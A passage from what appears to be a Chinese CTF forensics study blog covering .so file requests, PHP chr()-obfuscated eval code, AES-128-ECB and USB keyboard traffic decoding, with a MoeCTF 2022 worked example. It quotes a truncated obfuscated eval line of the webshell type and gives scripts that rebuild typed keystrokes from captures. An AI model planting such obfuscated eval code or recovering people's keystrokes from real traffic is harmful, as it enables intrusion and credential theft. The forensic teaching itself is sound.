title=".so文件"></a>.so文件</h3><p>在Linux或Unix系统中，**.so文件<strong>（即共享对象文件，</strong>Shared Object<strong>）是一种动态链接库文件，类似于Windows系统中的</strong>.dll文件**。它们通常包含可以在运行时动态加载的可执行代码。共享对象文件的主要作用是共享库函数或代码，以减少冗余和提高效率。</p><p>在网络流量中，如果涉及到请求或操作<code>.so</code>文件，通常意味着：</p><ol><li><strong>动态库的使用</strong>：该 <code>.so</code> 文件可能用于执行某些特定功能，特别是在服务器端的应用程序或服务中，调用共享库来完成某些任务。应用程序会在需要的时候加载这些库，而不是在程序启动时将其全部加载进来。</li><li><strong>远程执行</strong>：如果流量中有涉及到 <code>.so</code> 文件的请求（例如 <code>GET</code> 请求），可能是在服务器上请求下载或者远程加载这些库。</li><li><strong>执行权限</strong>：某些 <code>POST</code> 或 <code>GET</code> 请求涉及到 <code>.so</code> 文件时，可能是在触发某种需要运行库文件中的代码的操作。这种情况可能在动态网页、服务器脚本或应用程序中使用。</li></ol><p>如果 <code>.so</code> 文件通过 HTTP 请求传输，这可能意味着文件下载或者是远程调用特定的库。这类操作一般出现在一些服务器应用环境中，通过调用这些动态库来实现某些复杂的操作。</p><h3 id="chr编码"><a href="#chr编码" class="headerlink" title="chr编码"></a>chr编码</h3><p>在PHP中，<code>chr()</code> 函数将整数值转换为对应的ASCII字符。通常，攻击者使用这种方式动态生成字符串，目的是混淆代码，使得源代码难以直接阅读。在这个示例中，攻击者使用了一系列 <code>chr()</code> 函数来逐字符构造PHP代码，以执行恶意操作。</p><p><strong>如何解析<code>chr</code>编码</strong></p><p>攻击者使用 <code>chr()</code> 函数，像这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">eVAl</span>(<span class="title function_ invoke__">cHr</span>(<span class="number">0x40</span>).<span class="title function_ invoke__">ChR</span>(<span class="number">0x69</span>).<span class="title function_ invoke__">ChR</span>(<span class="number">0x6e</span>).<span class="title function_ invoke__">ChR</span>(<span class="number">0x69</span>).<span class="title function_ invoke__">ChR</span>(<span class="number">0x5f</span>) ...)</span><br></pre></td></tr></table></figure><p>要将这些编码转换回字符串，首先需要了解每个 <code>chr()</code> 函数中的参数代表的ASCII码。</p><p>例如：</p><ul><li><code>chr(0x40)</code>：<code>0x40</code> 是十六进制数，等于十进制的 64，对应的字符是 <code>@</code>。</li><li><code>chr(0x69)</code>：<code>0x69</code> 是十六进制数，等于十进制的 105，对应的字符是 <code>i</code>。</li><li><code>chr(0x6e)</code>：<code>0x6e</code> 是十六进制数，等于十进制的 110，对应的字符是 <code>n</code>。</li></ul><p>通过将每个 <code>chr()</code> 调用的参数转换为字符，你可以拼凑出攻击者的代码。</p><h3 id="AES-128-ECB"><a href="#AES-128-ECB" class="headerlink" title="AES-128-ECB"></a>AES-128-ECB</h3><p>AES-128-ECB 是一种使用高级加密标准（AES）算法的加密模式，其中：</p><ul><li><strong>AES</strong>：高级加密标准（Advanced Encryption Standard）是一种对称加密算法。</li><li><strong>128</strong>：表示密钥长度为 128 位。</li><li><strong>ECB</strong>：电子密码本模式（Electronic Codebook），它是 AES 的一种工作模式。</li></ul><p><strong>主要特点</strong>：</p><ul><li><p><strong>对称加密</strong>：AES-128-ECB 是对称加密算法，这意味着同一个密钥用于加密和解密。</p></li><li><p><strong>块加密</strong>：AES 是块加密算法，处理固定长度的数据块（128 位），较短的消息会通过填充来适应块的大小。</p></li><li><p>ECB 模式的特性</p><p>：</p><ul><li>在 ECB 模式下，消息被分割成固定长度的块，然后每个块分别加密。</li><li><strong>缺点</strong>：ECB 模式的主要问题是相同的明文块在加密后会生成相同的密文块，这使得它容易受到模式分析攻击。</li><li><strong>不推荐</strong>：由于这种模式的缺陷，ECB 通常不用于加密敏感数据。</li></ul></li></ul><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>CTF USB流量分析题技巧</p><ol><li>理解USB协议和HID设备</li></ol><ul><li><strong>USB协议</strong>：USB（Universal Serial Bus）是一种标准，用于设备和主机（如PC）之间的通信。</li><li><strong>HID设备</strong>：HID（Human Interface Device）设备包括键盘、鼠标等，它们通过HID协议与主机通信，发送类似键盘按键的扫描码（scan code）。</li></ul><ol start="2"><li>使用合适的工具</li></ol><ul><li><strong>Wireshark&#x2F;Tshark</strong>：用于分析USB流量，支持多种协议，包括USB HID设备的数据。</li><li><strong>USBPcap</strong>：Windows系统上用于捕获USB流量的工具，常与Wireshark结合使用。</li><li><strong>Python脚本</strong>：有时需要自定义脚本来解析和转换扫描码为实际字符。</li></ul><ol start="3"><li>分析步骤</li></ol><p>​3.1 加载USB流量文件</p><p>​首先，使用Wireshark或Tshark加载PCAP或PCAPNG文件，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>​这条命令会提取USB HID相关数据并输出到 <code>usbdata.txt</code> 文件中。</p><p>​3.2 过滤USB HID数据</p><p>​在Wireshark中，可以使用以下过滤器来过滤HID数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usb.transfer_type == 0x01 &amp;&amp; usbhid</span><br></pre></td></tr></table></figure><p>​或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usbhid.data</span><br></pre></td></tr></table></figure><p>​3.3 理解键盘扫描码</p><p>​USB键盘的流量通常是8字节的报告，每个字节代表不同的键盘状态或键值：</p><ul><li><strong>Byte 0：Modifier</strong>：表示是否按下了修饰键（如Shift、Ctrl等）。</li><li><strong>Byte 2-7：Key codes</strong>：表示按下的键的扫描码。</li></ul><p>​常见键盘扫描码（HID usage tables）：</p><table><thead><tr><th>扫描码</th><th>对应字符</th></tr></thead><tbody><tr><td>0x04</td><td>a</td></tr><tr><td>0x05</td><td>b</td></tr><tr><td>0x06</td><td>c</td></tr><tr><td>0x07</td><td>d</td></tr><tr><td>0x08</td><td>e</td></tr></tbody></table><p>​3.4 手动或自动提取数据</p><p>​可以使用Python脚本将扫描码转换为对应字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">scancodes = &#123;</span><br><span class="line">    <span class="number">0x04</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">0x05</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">0x06</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">0x07</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">0x08</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="number">0x09</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">0x0a</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">0x0b</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">0x0c</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">0x0d</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="number">0x0e</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">0x0f</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">0x10</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">0x11</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">0x12</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="number">0x13</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">0x14</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">0x15</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">0x16</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">0x17</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="number">0x18</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">0x19</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">0x1a</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">0x1b</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">0x1c</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="number">0x1d</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">0x1e</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">0x1f</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">0x20</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">0x21</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="number">0x22</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">0x23</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">0x24</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">0x25</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">0x26</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    <span class="number">0x27</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例数据</span></span><br><span class="line">data = [<span class="number">0x04</span>, <span class="number">0x0b</span>, <span class="number">0x1f</span>]  <span class="comment"># 扫描码示例</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span>.join([scancodes.get(code, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> code <span class="keyword">in</span> data])</span><br><span class="line"><span class="built_in">print</span>(output)  <span class="comment"># 输出 &quot;ah2&quot;</span></span><br></pre></td></tr></table></figure><p>​3.5 处理修饰键（如Shift、Ctrl）</p><p>​第一个字节表示修饰键（如Shift），如果按下了Shift键，你需要将对应的字符转换为大写或符号。例如，<code>0x02</code> 表示左Shift键被按下，那么后续的字符应为大写。</p><p>​3.6 验证和重构输入</p><p>​通过分析USB键盘流量，可以重构用户输入的命令或密码。在CTF中，题目可能要求你从USB流量中提取攻击者输入的命令或敏感信息。</p><h3 id="例题（USB）"><a href="#例题（USB）" class="headerlink" title="例题（USB）"></a>例题（USB）</h3><h4 id="MoeCTF-2022-usb"><a href="#MoeCTF-2022-usb" class="headerlink" title="[MoeCTF 2022]usb"></a>[MoeCTF 2022]usb</h4><p>无题目描述</p><p>打开附件观察流量包发现是USB中的键盘流量，使用</p><p>[UsbKeyboardDataHacker.py]: <a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py</a>“UsbKeyboardDataHacker.py”</p><p>如图所示，遗憾的是未能发现有用信息。</p><p><img src="https://haslet007.github.io/img/image-20240921184356654.png" alt="image-20240921184356654"></p><p>转换思路，使用tshark提取出data数据</p><p><code>tshark -r usb.pcapng -T fields -e usbhid.data -Y &quot;frame.len == 35&quot; &gt; data1.txt</code></p><p>预处理HID内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">out=<span class="string">&quot;&quot;</span></span><br><span class="line">line = line.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(line)==<span class="number">16</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(line),<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(line):</span><br><span class="line">out+=line[i]+line[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out+=line[i]+line[i+<span class="number">1</span>]</span><br><span class="line">fi.write(out)</span><br><span class="line">fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><p>将预处理的内容跑字典得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span 